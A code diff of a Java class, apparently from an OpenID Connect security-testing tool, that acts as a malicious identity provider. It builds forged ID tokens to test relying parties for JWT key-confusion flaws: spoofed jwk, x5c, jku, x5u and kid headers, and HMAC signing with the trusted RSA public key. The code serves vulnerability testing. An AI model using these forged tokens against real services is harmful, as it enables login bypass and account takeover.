@@ -6,7 +6,9 @@ import com.nimbusds.jose.crypto.MACSigner;
 import com.nimbusds.jose.crypto.RSASSASigner;
 import com.nimbusds.jose.jwk.JWK;
 import com.nimbusds.jose.jwk.JWKSet;
+import com.nimbusds.jose.jwk.OctetSequenceKey;
 import com.nimbusds.jose.jwk.RSAKey;
+import com.nimbusds.jose.jwk.gen.OctetSequenceKeyGenerator;
 import com.nimbusds.jose.util.Base64;
 import com.nimbusds.jose.util.Base64URL;
 import com.nimbusds.jwt.JWT;
@@ -16,12 +18,17 @@ import com.nimbusds.oauth2.sdk.ParseException;
 import com.nimbusds.oauth2.sdk.http.HTTPRequest;
 import com.nimbusds.oauth2.sdk.http.ServletUtils;
 import com.nimbusds.oauth2.sdk.id.ClientID;
-import com.nimbusds.openid.connect.sdk.AuthenticationRequest;
 import com.nimbusds.openid.connect.sdk.Nonce;
 import com.nimbusds.openid.connect.sdk.claims.AccessTokenHash;
 import com.nimbusds.openid.connect.sdk.claims.CodeHash;
+import com.nimbusds.openid.connect.sdk.op.OIDCProviderMetadata;
 import com.nimbusds.openid.connect.sdk.rp.OIDCClientInformation;
 import de.rub.nds.oidc.server.RequestPath;
+import de.rub.nds.oidc.utils.KeyConfusionHelper;
+import de.rub.nds.oidc.utils.KeyConfusionPayloadType;
+import net.minidev.json.JSONArray;
+import net.minidev.json.JSONObject;
+import org.apache.commons.lang.RandomStringUtils;
 
 import javax.annotation.Nonnull;
 import javax.annotation.Nullable;
@@ -29,11 +36,13 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.ws.rs.core.UriBuilder;
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
 import java.net.URI;
 import java.security.GeneralSecurityException;
 import java.security.KeyStore;
+import java.security.PublicKey;
 import java.security.cert.CertificateEncodingException;
-import java.util.ArrayList;
+import java.util.*;
 import java.util.concurrent.CompletableFuture;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.TimeUnit;
@@ -41,50 +50,38 @@ import java.util.concurrent.TimeoutException;
 
 import static de.rub.nds.oidc.server.op.OPParameterConstants.*;
 
-// TODO: I think we dont need the INCLUDE_SIGNING_CERT param in the testplan at all?
-
 // TODO: didscovery must announce all algorithms used for signing in any testcase (EC, RSA, HS)
-
-// TODO: add kid in all testcases - kid sollte (fast) immer im header stehen, vor allem, wenn mehrere keys an der URL gehosted werden.
 
 public class KeyConfusionOP extends DefaultOP {
     private int requestCount = 0;
     private URI untrustedKeyUri;
-    private String untrustedKeyJsonResponse;
+    private String untrustedKeyResponseString;
 //    private CompletableFuture<?> waitForHonest;
 
     @Override
     protected JWT getIdToken(@Nonnull ClientID clientId, @Nullable Nonce nonce, @Nullable AccessTokenHash atHash,
                              @Nullable CodeHash cHash) throws GeneralSecurityException, JOSEException, ParseException {
 
+    	// TODO: use a URI on a different domain, completely unrelated to the OP - would require huge refactoring
         untrustedKeyUri = UriBuilder.fromUri(baseUri).path(this.UNTRUSTED_KEY_PATH).build();
 
-        SignedJWT signedJwt = null;
-        JWTClaimsSet claims = getIdTokenClaims(clientId, nonce, atHash, cHash);
-
-        if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_JKU)) {
-            signedJwt = jkuKeyConfusion(claims);
-        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_JWK)) {
-            signedJwt = jwkKeyConfusion(claims);
-        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_KID)) {
-            signedJwt = kidKeyConfusion(claims);
-        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_X5C)) {
-            signedJwt = x5cKeyConfusion(claims);
-        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_X5U)) {
-            signedJwt = x5uKeyConfusion(claims);
-        } else if ( params.getBool(FORCE_REGISTER_SAME_CLIENTID) ) {
+		JWTClaimsSet claims = getIdTokenClaims(clientId, nonce, atHash, cHash);
+		SignedJWT signedJwt;
+		if ( params.getBool(FORCE_REGISTER_SAME_CLIENTID) ) {
             // keyConfusion 6 (KC w/ SessionOverwriting)
-            signedJwt = hmacKeyConfusion(claims);
-         }
+            signedJwt = sessionOverwritingKeyConfusion(claims);
+        } else {
+            signedJwt = getKeyConfusionJWT(claims);
+        }
 
 
         // store keyresponse in context
-        //stepCtx.put(OPContextConstants.UNTRUSTED_KEY_RESPONSE, untrustedKeyJsonResponse);
+        //stepCtx.put(OPContextConstants.UNTRUSTED_KEY_RESPONSE, untrustedKeyResponseString);
 
         // TODO: add default case to make sure signedJwt is never null
-
-        logger.log("generated id_token header:\n" + signedJwt.getHeader().toString()); // TODO: this fails on "malformed" headers like {kid:JSONObject}
-        logger.log("generated id_token body:\n" + signedJwt.getPayload().toString());
+		Base64 header = new Base64(signedJwt.serialize().split("\\.")[0]);
+        logger.log("Generated id_token header:\n\n" + header.decodeToString());
+//        logger.log("generated id_token body:\n" + signedJwt.getPayload().toString());
 
         return signedJwt;
     }
@@ -97,7 +94,7 @@ public class KeyConfusionOP extends DefaultOP {
             super.authRequest(path, req, resp);
             return;
         }
-        // KC6 (KC w SessionOverwriting),
+        // KC6 (KeyConfusion w/ SessionOverwriting)
         try {
             if (type == OPType.HONEST) {
                 // second authreq
@@ -134,11 +131,15 @@ public class KeyConfusionOP extends DefaultOP {
             logger.log("Waiting for client to discover evil OP was interrupted.", ex);
         } catch (ExecutionException | TimeoutException ex) {
             logger.log("Waiting for client to discover evil failed.", ex);
-
         }
     }
 
+    /**
+     * A Request to the untrustedKey location indicates that the client processed a URI received in the ID Token)
+     */
+    @Override
     public void untrustedKeyRequest(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {
+
         // mark as SSRF vuln as requested URL was delivered to RP via id_token
         // (even through the frontchannel if implicit flow)
         // TODO: only FAIL here if (implict || hybrid) flow is used?
@@ -148,222 +149,331 @@ public class KeyConfusionOP extends DefaultOP {
         logger.logHttpRequest(req, null);
 
 //        String jsonString = (String) stepCtx.get(OPContextConstants.UNTRUSTED_KEY_RESPONSE);
-//        untrustedKeyJsonResponse = Strings.isNullOrEmpty(jsonString) ? "{}" : jsonString;
-        untrustedKeyJsonResponse = Strings.isNullOrEmpty(untrustedKeyJsonResponse) ? "{}" : untrustedKeyJsonResponse;
+//        untrustedKeyResponseString = Strings.isNullOrEmpty(jsonString) ? "{}" : jsonString;
+        untrustedKeyResponseString = Strings.isNullOrEmpty(untrustedKeyResponseString) ? "{}" : untrustedKeyResponseString;
 
-        resp.getWriter().write(untrustedKeyJsonResponse);
+        resp.getWriter().write(untrustedKeyResponseString);
         resp.setContentType("application/json; charset=UTF-8");
         resp.flushBuffer();
-        logger.logHttpResponse(resp, untrustedKeyJsonResponse);
+        logger.logHttpResponse(resp, untrustedKeyResponseString);
     }
 
+    // Make sure the required ID Token signing algorithms are included in the discovery response
+	// only effective if registration is enforced using the TestParameter
+	//		<Parameter Key="dynamic_client_registration_support_needed">true</Parameter>
+	@Override
+	public void providerConfiguration(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {
+		logger.log("Provider configuration requested.");
+		logger.logHttpRequest(req, null);
+		try {
+			OIDCProviderMetadata md = getDefaultOPMetadata();
+			// override default JWS algorithsm for ID Token signing
+			md.setIDTokenJWSAlgs(getOPMetadataJWSAlgs()); // TODO: double check that htis override works as intended
 
-    // JKU KC
-    private SignedJWT jkuKeyConfusion(JWTClaimsSet claims) throws JOSEException {
+			String mdStr = md.toJSONObject().toString();
+			resp.setContentType("application/json");
+			resp.getWriter().write(mdStr);
+			resp.flushBuffer();
+			logger.log("Returning default provider config.");
+			logger.logHttpResponse(resp, mdStr);
+		} catch (IOException | ParseException ex) {
+			logger.log("Failed to process provider config.", ex);
+			resp.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+			resp.flushBuffer();
+			logger.logHttpResponse(resp, null);
+		}
+	}
 
-        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
+	private List<JWSAlgorithm> getOPMetadataJWSAlgs() {
+		List<JWSAlgorithm> algs = new ArrayList<>();
+		if (params.getBool(OPParameterConstants.OP_MD_JWSA_HS256)) {
+			algs.add(JWSAlgorithm.HS256);
+		}
+		if (params.getBool(OPParameterConstants.OP_MD_JWSA_RS256)) {
+			algs.add(JWSAlgorithm.RS256);
+		}
+		if (params.getBool(OPParameterConstants.OP_MD_JWSA_NONE)) {
+			algs.add(JWSAlgorithm.parse("none"));
+		}
+
+		// default
+		if (algs.isEmpty()) {
+			algs = Arrays.asList(JWSAlgorithm.RS256, JWSAlgorithm.parse("none"));
+		}
+		return algs;
+	}
+
+	/**
+	 * Generate an ID Token signed with a key unknown to the client. Depending on the OP Configuration,
+	 * various JWT Header fields lure the client to use the signing key included in the ID Token or to request
+	 * the key from an untrustworthy URL (which has not been announced during Discovery but is included in the token)
+	 */
+    private SignedJWT getKeyConfusionJWT(JWTClaimsSet claims) throws JOSEException, CertificateEncodingException {
+    	// A Key that is unknown to the client
+		KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
         RSAKey key = getSigningJwk(untrustedEntry);
 
-        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
-                .type(JOSEObjectType.JWT);
-        // jku field in id_token header points to untrustedKeyUri, where the untrusted key is served as jwks
-        hb.jwkURL(untrustedKeyUri);
+		// the key thats also returned from the benign/trusted JWKS Url
+		JWK trustedKey = getSigningJwk(opivCfg.getEvilOPSigningEntry()).toPublicJWK();
 
-        if (requestCount == 0) {
-            // prepare key to be served at untrustedKeyUri
-            untrustedKeyJsonResponse = key.toPublicJWK().toString();
-        } else if (requestCount == 1) {
-            // the hosted jwks contains both the untrusted key and the trusted (as served on discovery endpoint)
-            JWK trustedKey = getSigningJwk(opivCfg.getEvilOPSigningEntry()).toPublicJWK();
+		// default signing algorithm
+		String algorithm = "RS256";
 
-            ArrayList<JWK> list = new ArrayList<>();
-            list.add(key.toPublicJWK());
-            list.add(trustedKey);
-            JWKSet jwkSet = new JWKSet(list);
-            untrustedKeyJsonResponse = jwkSet.toString();
-        } else if (requestCount == 2) {
-            // the hosted jwks contains trusted key at first position and the untrusted key second
-            JWK trustedKey = getSigningJwk(opivCfg.getEvilOPSigningEntry()).toPublicJWK();
+		JSONObject jsonHeader = new JSONObject();
+		// "typ" header parameter is optional acc. to RFC7519, Section 5.1
+		jsonHeader.put("typ", "JWT");
 
-            ArrayList<JWK> list = new ArrayList<>();
-            list.add(trustedKey);
-            list.add(key.toPublicJWK());
-            JWKSet jwkSet = new JWKSet(list);
-            untrustedKeyJsonResponse = jwkSet.toString();
-            // signal Browser that all test runs have been finished
-            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
-        }
+		if (params.getBool(FORCE_NEW_KID_IN_IDTOKEN_AND_JWK)) {
+			// add a kid that is unkown to the client to JWT header, JWK, and the JWKS served from untrustedKeyUri
+			String randomKeyID = RandomStringUtils.randomAlphanumeric(12);
+			jsonHeader.put("kid", randomKeyID);
 
-        // increase request counter
-        requestCount += 1;
+			RSAKey newKey = new RSAKey.Builder(key).keyID(randomKeyID).build();
+			key = newKey;
+		}
 
-        logger.log("Prepared untrusted key response:");
-        logger.log(untrustedKeyJsonResponse);
+		// jwk KeyConfusion - the signing key is included in the token's jwk member
+		if (params.getBool(IDTOKEN_SPOOFED_JWK)) {
+			JSONObject tmpKey = key.toPublicJWK().toJSONObject();
+			tmpKey.remove("x5c"); // is added, when INCLUDE_SIGNING_CERT is set in test spec
+//			jsonHeader.put("jwk", key.toPublicJWK());
+			jsonHeader.put("jwk", tmpKey);
+			jsonHeader.putIfAbsent("alg", algorithm);
+		} else if (params.getBool(IDTOKEN_SPOOFED_JKU_AS_JWK)) {
+			jsonHeader.put("jwk", untrustedKeyUri.toString());
+			jsonHeader.putIfAbsent("alg", algorithm);
+			//TODO
+//			untrustedKeyResponseString = key.toPublicKey().toString();
+			untrustedKeyResponseString = new JWKSet(key.toPublicJWK()).toString(); //TODO outerscope
+		}
 
-        // prepare and sign id_token
-        JWSHeader header = hb.build();
-        SignedJWT signedJwt = new SignedJWT(header, claims);
-        JWSSigner signer = new RSASSASigner(key);
-        signedJwt.sign(signer);
+		// x5c KeyConfusion - the signin key is included in the token's x5c member
+		if (params.getBool(IDTOKEN_SPOOFED_X5C)) {
+			jsonHeader.putIfAbsent("alg", algorithm);
+			ArrayList<Base64> list = new ArrayList<>();
+			Base64 untrustedCert = Base64.encode(untrustedEntry.getCertificate().getEncoded());
+			Base64 trustedCert = Base64.encode(opivCfg.getEvilOPSigningEntry().getCertificate().getEncoded());
 
-        return signedJwt;
-        // TODO: early exit, if untrustedKeyUri was not requested after first try.
-    }
+			if (params.getBool(X5C_UNTRUSTED_FIRST)) {
+				// untrusted cert first, trusted second
+				list.add(untrustedCert);
+				list.add(trustedCert);
+			} else if (params.getBool(X5C_TRUSTED_FIRST)) {
+				// trusted first, untrusted second
+				list.add(trustedCert);
+				list.add(untrustedCert);
+			} else {
+				list.add(untrustedCert);
+			}
 
-    // TODO: add test case for URL: untrustedKeyURi im JWK tag des headers angeben
-    // TODO: add hmac jwk with "jwk":{"kty": "oct", "k": Base64(key)}
-    // The JWK KC
-    private SignedJWT jwkKeyConfusion(JWTClaimsSet claims) throws JOSEException {
+			if (!list.isEmpty()) {
+				JSONArray arr = new JSONArray();
+				arr.addAll(list);
+				jsonHeader.put("x5c", arr);
+			}
+		}
 
-        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
-        RSAKey key = getSigningJwk(untrustedEntry);
+		// JKU points to unknown URI which returns JWK used to sign the ID Token
+		if (params.getBool(IDTOKEN_SPOOFED_JKU)) {
+			jsonHeader.putIfAbsent("alg", algorithm);
+			jsonHeader.put("jku", untrustedKeyUri.toString());
 
-        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
-                .type(JOSEObjectType.JWT);
-        hb.jwk(key.toPublicJWK());
+			// prepare response to a request of the untrustedKeyUri
+			ArrayList<JWK> keySet = new ArrayList<>();
+			if (params.getBool(JKU_TRUSTED_FIRST)) {
+				// jwks URI returns [trusted, untrusted]
+				// i.e., the hosted jwks contains both the untrusted key (used for signing) and the trusted key (as served on discovery endpoint)
+				keySet.add(trustedKey);
+				keySet.add(key.toPublicJWK());
+			} else if (params.getBool(JKU_UNTRUSTED_FIRST)) {
+				// jwks returns [untrusted, trusted]
+				// the hosted jwks contains both the untrusted key and the trusted (as served on discovery endpoint)
+				keySet.add(key.toPublicJWK());
+				keySet.add(trustedKey);
+			} else {
+				// only serve the untrusted key that is used to sign the JWT
+				keySet.add(key);
+			}
+			JWKSet jwkSet = new JWKSet(keySet);
+			untrustedKeyResponseString = jwkSet.toString();//TODO outerscope
+		} else if (params.getBool(IDTOKEN_SPOOFED_X5U)) {
+			// x5u points to unknown URI that responds with the x509 cert corresponding to the signing key
+			jsonHeader.putIfAbsent("alg", algorithm);
+			jsonHeader.put("x5u", untrustedKeyUri.toString());
 
-        logger.log("No untrusted key response for this test");
-//        logger.log(untrustedKeyJsonResponse.toString());
-
-        JWSHeader header = hb.build();
-
-        SignedJWT signedJwt = new SignedJWT(header, claims);
-        JWSSigner signer = new RSASSASigner(key);
-        signedJwt.sign(signer);
-
-        // there is only one test case for jwk key confusion
-        stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
-
-        return signedJwt;
-    }
-
-
-    // The KID KC
-    private SignedJWT kidKeyConfusion(JWTClaimsSet claims) throws JOSEException {
-        JWSHeader header;
-
-        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
-        RSAKey key = getSigningJwk(untrustedEntry);
-
-        if (requestCount == 0) {
-            JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
-                    .type(JOSEObjectType.JWT);
-            hb.keyID(untrustedKeyUri.toString());
-            header = hb.build();
-        } else { // if (requestCount == 1) {
-//            JSONObject jsonKey = key.toPublicJWK().toJSONObject();
-//            JsonObject jsonKey = Json.createObjectBuilder().add("kid", key.toJSONString()).build();
-//            header = JWSHeader.parse(jsonKey.toString());
-            JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256).type(JOSEObjectType.JWT);
-            //hb.keyID(key.toPublicJWK().toString());
-            // TODO: ^this does not add a valid json object as kid - rewrite JWT / extend unsafe JWT
-            // instead the key is auto converted to a string -
-//            hb.customParam("kid", key.toPublicJWK());
-
-            // TODO TEST and change
-            hb.parsedBase64URL(Base64URL.encode("{\"alg\":\"RS256\",\"typ\":\"JWT\",\"kid\":" + key.toPublicJWK().toJSONString() + "}")); // this seems to work, but logging the header fails apparently ??
-            header = hb.build();
-
-            // this was the last test step for kid key confusion
-            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
-        }
-
-        SignedJWT signedJwt = new SignedJWT(header, claims);
-        JWSSigner signer = new RSASSASigner(key);
-        signedJwt.sign(signer);
-
-        untrustedKeyJsonResponse = key.toPublicJWK().toString();
-        logger.log("Prepared untrusted key response:");
-        logger.log(untrustedKeyJsonResponse.toString());
-
-        requestCount++;
-        return signedJwt;
-    }
+			untrustedKeyResponseString = untrustedEntry.getCertificate().toString(); // should be a x509 cert, not json
+//			System.out.println(untrustedKeyResponseString); // TODO test this...
+		}
 
 
-    // The X5C KC
-    private SignedJWT x5cKeyConfusion(JWTClaimsSet claims) throws JOSEException, CertificateEncodingException {
-        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256).type(JOSEObjectType.JWT);
-        ArrayList<Base64> list = new ArrayList<>();
-        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
-        RSAKey key = getSigningJwk(untrustedEntry);
 
-        Base64 untrustedCert = Base64.encode(untrustedEntry.getCertificate().getEncoded());
+		/* *********************************** */
+		/* Highly speculative and experimental */
 
-        if (requestCount == 0) {
-            // untrusted cert only
-            list.add(untrustedCert);
-        } else if (requestCount == 1) {
-            // trusted first, untrusted second
-            Base64 trustedCert = Base64.encode(opivCfg.getEvilOPSigningEntry().getCertificate().getEncoded());
-            list.add(trustedCert);
-            list.add(untrustedCert);
-        } else if (requestCount == 2) {
-            // untrusted cert first, trusted second
-            Base64 trustedCert = Base64.encode(opivCfg.getEvilOPSigningEntry().getCertificate().getEncoded());
+		// invalid kid field values (URI or JWK)
+		if (params.getBool(IDTOKEN_SPOOFED_JKU_AS_KID)) {
+			jsonHeader.putIfAbsent("alg", algorithm);
 
-            list.add(untrustedCert);
-            list.add(trustedCert);
+			jsonHeader.appendField("kid", untrustedKeyUri.toString());
+			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
+			untrustedKeyResponseString = jwkSet.toString(); //TODO outerscope
+		}
+		if (params.getBool(IDTOKEN_SPOOFED_JWK_AS_KID)) {
+			jsonHeader.putIfAbsent("alg", algorithm);
 
-            // this is the last test case for x5c key confusion
-            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
-        }
+			jsonHeader.appendField("kid", key.toPublicJWK());
+			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
+			untrustedKeyResponseString = jwkSet.toString(); //TODO outerscope
+		}
 
-        hb.x509CertChain(list);
-        JWSHeader header = hb.build();
+		// invalid jwk field that points to a untrusted JKU, i.e., {..., jwk: {jku:untrustedURI, ...}}
+		if (params.getBool(IDTOKEN_SPOOFED_JKU_IN_JWK)) {
+			jsonHeader.putIfAbsent("alg", algorithm);
 
-        SignedJWT signedJwt = new SignedJWT(header, claims);
-        JWSSigner signer = new RSASSASigner(key);
-        signedJwt.sign(signer);
+			JSONObject jwk = key.toPublicJWK().toJSONObject();
+			jwk.remove("jku");
+			jwk.put("jku", untrustedKeyUri.toString());
+			jsonHeader.remove("jwk");
+			jsonHeader.put("jwk", jwk);
 
-        requestCount++;
-        return signedJwt;
-    }
+			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
+			untrustedKeyResponseString = jwkSet.toString();//TODO outerscope
+		}
+		/* *********************************** */
+
+		// set "crit" field, may urge some clients to process the spoofed fields
+		Set<String> criticalParams = new HashSet<>();
+		if (params.getBool(IDTOKEN_CRITICAL_JKU)) {
+			criticalParams.add("jku");
+		}
+		if (params.getBool(IDTOKEN_CRITICAL_JWK)) {
+			criticalParams.add("jwk");
+		}
+		if (params.getBool(IDTOKEN_CRITICAL_X5C)) {
+			criticalParams.add("x5c");
+		}
+		if (params.getBool(IDTOKEN_CRITICAL_KID)) {
+			criticalParams.add("kid");
+		}
+		if (params.getBool(IDTOKEN_CRITICAL_X5U)) {
+			criticalParams.add("x5u");
+		}
+		if (!criticalParams.isEmpty()) {
+			JSONArray arr = new JSONArray();
+			criticalParams.stream().forEach(e -> arr.appendElement(e));
+			jsonHeader.put("crit", arr);
+		}
+
+		// actual generation and signing of the JWT (only if jsonHeader has been marked with alg:RS256)
+		if (jsonHeader.getOrDefault("alg", null) == "RS256") {
+			JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
+					// note: using .parsedBase64URL() can override the JWSAlgorithm set in the Builder's constructor
+					.parsedBase64URL(Base64URL.encode(jsonHeader.toJSONString())).build();
+			SignedJWT signedJwt = new SignedJWT(header, claims);
+			JWSSigner signer = new RSASSASigner(key);
+			signedJwt.sign(signer);
+
+			return signedJwt;
+		}
+		// end RSA Type
 
 
-    // TODO: check x5uURL vs jwkURL
-    // The X5U KC
-    private SignedJWT x5uKeyConfusion(JWTClaimsSet claims) throws JOSEException {
-        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
-        RSAKey key = getSigningJwk(untrustedEntry);
+		/* HMAC based key confusion attacks */
 
-        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
-                .type(JOSEObjectType.JWT);
-        hb.x509CertURL(untrustedKeyUri);
-        JWSHeader header = hb.build();
+		// make sure we use the correct "alg"
+		jsonHeader.remove("alg");
+		algorithm = "HS256";
+		String macKey = "default-value";
+		JSONObject trustedJwkJSON = trustedKey.toPublicJWK().toJSONObject();
 
-        SignedJWT signedJwt = new SignedJWT(header, claims);
-        JWSSigner signer = new RSASSASigner(key);
-        signedJwt.sign(signer);
+		if (params.getBool(IDTOKEN_SPOOFED_SECRET_KEY_)) {
+			// include HMAC key in jwk parameter of ID Token
+			jsonHeader.putIfAbsent("alg", algorithm);
+			JSONObject octJwk = new OctetSequenceKeyGenerator(256).generate().toJSONObject();
 
-        untrustedKeyJsonResponse = key.toPublicJWK().toString();
-        logger.log("Prepared untrusted key response:");
-        logger.log(untrustedKeyJsonResponse);
+			if (jsonHeader.containsKey("kid")) {
+				// enforced due to OP param FORCE_NEW_KID_IN_IDTOKEN_AND_JWK
+				octJwk.put("kid", jsonHeader.get("kid"));
+			}
+			jsonHeader.put("jwk", octJwk);
+			macKey = octJwk.getAsString("k");
+		} // TODO: missing variant: w new registration and HS256 in OPMeta (default only announces RS256 and none);
 
-        // there is only one test case for x5u key confusion
-        stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
+		// using (parts of) trusted Public RSAKey as HMAC Key
+		if (params.getBool(IDTOKEN_HMAC_PUBKEY_e)) {
+			macKey = trustedJwkJSON.getAsString("e");
+			jsonHeader.putIfAbsent("alg", algorithm);
+		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_alg)) {
+			macKey = trustedJwkJSON.getAsString("alg");
+			jsonHeader.putIfAbsent("alg", algorithm);
+		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_kty)) {
+			macKey = trustedJwkJSON.getAsString("kty");
+			jsonHeader.putIfAbsent("alg", algorithm);
+		} else if (params.getBool(IDTOKEN_HMAC_PUBKKEY_n)) {
+			macKey = trustedJwkJSON.getAsString("n");
+			jsonHeader.putIfAbsent("alg", algorithm);
+		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_JWKSTRING)) {
+			macKey = trustedJwkJSON.toString();
+			jsonHeader.putIfAbsent("alg", algorithm);
+//			System.out.println(macKey); // TODO: doublecheck correctness
+			// TODO: add a variant without JSON string escaping (/ => \/)
+		}
+		// TODO: these tests require that RS256 was announced in discovery while signing w. HS256
 
-        return signedJwt;
-    }
+		// make sure the trusted signing key returned from the trusted JWKS Endpoint includes the same kid
+		// (only works if new discovery/registration is enforced)
+		if (jsonHeader.containsKey("kid")) {
+			//TODO: this is problematic, as the jwks could be requested and cached during discovery
+			stepCtx.put(OPContextConstants.SIGNING_JWK_KEYID, jsonHeader.getAsString("kid"));
+		}
 
-    // TODO: KeyConfusion 6: adjust SessionOverwritingOP or add logic here
+		PublicKey publicKey = ((RSAKey) trustedKey).toPublicKey();
+		if (params.getBool(IDTOKEN_HMAC_PUBKEY_PKCS1)) {
+			String pkcs1KeyString = KeyConfusionHelper.convertPKCS8toPKCS1PemString(publicKey);
+			if (pkcs1KeyString == null) {
+				logger.log("Key conversion failed");
+				throw new CertificateEncodingException("Error converting JWK to PEM");
+			}
+			String payloadType = params.get(P1_KEY_CONFUSION_PAYLOAD_TYPE);
+			try {
+				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType), pkcs1KeyString);
+			} catch (IllegalArgumentException e) {
+				logger.log("Unknown Payload type " + payloadType);
+				throw new CertificateEncodingException("Error converting JWK to PEM");
+			}
+			jsonHeader.putIfAbsent("alg", algorithm);
 
-//
-//    public JWSObject decodeJOSEString(String encodedJOSE) throws java.text.ParseException {
-//        String[] splittedString = encodedJOSE.split("\\.");
-//        JWSObject jwsObject = new SignedJWT(new Base64URL(splittedString[0]), new Base64URL(splittedString[1]), new Base64URL(splittedString[2]));
-//        return jwsObject;
-//    }
+		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_PKCS8)) {
+			String payloadType = params.get(P8_KEY_CONFUSION_PAYLOAD_TYPE);
+			try {
+				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType), publicKey);
+			} catch (IllegalArgumentException | UnsupportedEncodingException e) {
+				logger.log("Unknown Payload type  or unsupporte key encoding");
+				throw new CertificateEncodingException(e);
+			}
+			jsonHeader.putIfAbsent("alg", algorithm);
 
-    private SignedJWT hmacKeyConfusion(JWTClaimsSet claims) throws GeneralSecurityException {
-		logger.log("hmackkeyconfusion");
-        // replace client ID (use same ID for evil and honest
+		}
+		
+		// actual "signing"
+		logger.log("Using MAC key: " + macKey);
+		// TODO: make sure macKey has been set (!= "default-value")
+		JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.HS256)
+				.parsedBase64URL(Base64URL.encode(jsonHeader.toJSONString())).build();
+		SignedJWT signedJWT = new SignedJWT(header, claims);
+
+		JWSSigner signer = new MACSigner(macKey);
+		signedJWT.sign(signer);
+
+		return signedJWT;
+	}
+	
+    private SignedJWT sessionOverwritingKeyConfusion(JWTClaimsSet claims) throws GeneralSecurityException {
+//		logger.log("hmackkeyconfusion");
+        
+		// replace client ID (use same ID for evil and honest
         OIDCClientInformation cinfo = (OIDCClientInformation) stepCtx.get(OPContextConstants.REGISTERED_CLIENT_INFO_EVIL);
-//        ClientID cid = cinfo.getID();
-        //claims. //= super.getIdTokenClaims(cid, nonce, atHash, cHash);
-
-//        JWTClaimsSet newClaims = super.getIdTokenClaims(cid, claims.getClaim("nonce"), claims.getClaim("atHash"), claims.getClaim("cHash"));
-		logger.log(cinfo.getOIDCMetadata().toString());
+        logger.log(cinfo.getOIDCMetadata().toString());
 
         JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.HS256).type(JOSEObjectType.JWT);
         JWSHeader header = hb.build();
@@ -374,7 +484,7 @@ public class KeyConfusionOP extends DefaultOP {
         	if (key == null) {logger.log("key is null...");}
             JWSSigner signer = new MACSigner(key);
             signedJwt.sign(signer);
-//            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
+
             return signedJwt;
         } catch (JOSEException e) {
             throw new GeneralSecurityException(e);
